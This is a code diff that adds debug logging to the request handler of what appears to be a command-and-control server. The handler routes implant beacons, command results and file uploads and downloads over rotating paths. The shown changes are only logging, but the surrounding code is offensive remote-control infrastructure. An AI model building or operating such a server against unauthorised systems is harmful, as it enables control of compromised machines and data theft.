@@ -106,8 +106,17 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
         # Extract base path without query string for routing
         base_path = self.path.split('?')[0] if '?' in self.path else self.path
 
+        # Log all available paths for debugging
+        self.external_logger(f"Available paths: {self.path_router.get_current_paths()}")
+        self.external_logger(f"Routing request for path: {base_path}")
+        
+        # Print path mapping for debugging
+        if hasattr(self.path_router, 'path_mapping'):
+            self.external_logger(f"Path mapping: {self.path_router.path_mapping}")
+
         # Check which endpoint this path maps to
         endpoint_type = self.path_router.get_endpoint_type(base_path)
+        self.external_logger(f"Endpoint type determined: {endpoint_type}")
         
         # Route to appropriate handler based on endpoint type
         if endpoint_type in ["beacon_path", "previous_beacon_path", "old_beacon_path"]:
@@ -129,9 +138,14 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
         
         # Log the request
         self.log_message("Received POST request for %s", self.path)
+        
+        # Log all available paths for debugging
+        self.external_logger(f"Available paths: {self.path_router.get_current_paths()}")
+        self.external_logger(f"Routing POST request for path: {self.path}")
 
         # Check which endpoint this path maps to
         endpoint_type = self.path_router.get_endpoint_type(self.path)
+        self.external_logger(f"POST endpoint type determined: {endpoint_type}")
         
         # Route to appropriate handler based on endpoint type
         if endpoint_type in ["beacon_path", "previous_beacon_path", "old_beacon_path"]:
@@ -140,11 +154,14 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
         elif endpoint_type in ["cmd_result_path", "previous_cmd_result_path", "old_cmd_result_path"]:
             self._handle_result()
         elif endpoint_type in ["file_upload_path", "previous_file_upload_path", "old_file_upload_path"]:
+            self.external_logger(f"Handling file upload request")
             self._handle_file_upload()
         elif endpoint_type in ["file_request_path", "previous_file_request_path", "old_file_request_path"]:
+            self.external_logger(f"Handling file download request")
             self._handle_file_download()  # This should already exist in your code
         else:
             # Return a generic 200 response for unmatched paths
+            self.external_logger(f"No handler found for {self.path}, using default handler")
             self._handle_default()
     
     def _handle_beacon(self, include_rotation_info=False):
@@ -193,6 +210,7 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
     
     def _handle_file_upload(self):
         """Handle file upload requests using FileHandler"""
+        self.external_logger(f"Creating FileHandler for file upload")
         handler = FileHandler(
             self, 
             self.client_manager, 
@@ -204,6 +222,7 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
     
     def _handle_file_download(self):
         """Handle file download requests using FileDownloadHandler"""
+        self.external_logger(f"Creating FileDownloadHandler for file download")
         handler = FileDownloadHandler(
             self, 
             self.client_manager, 
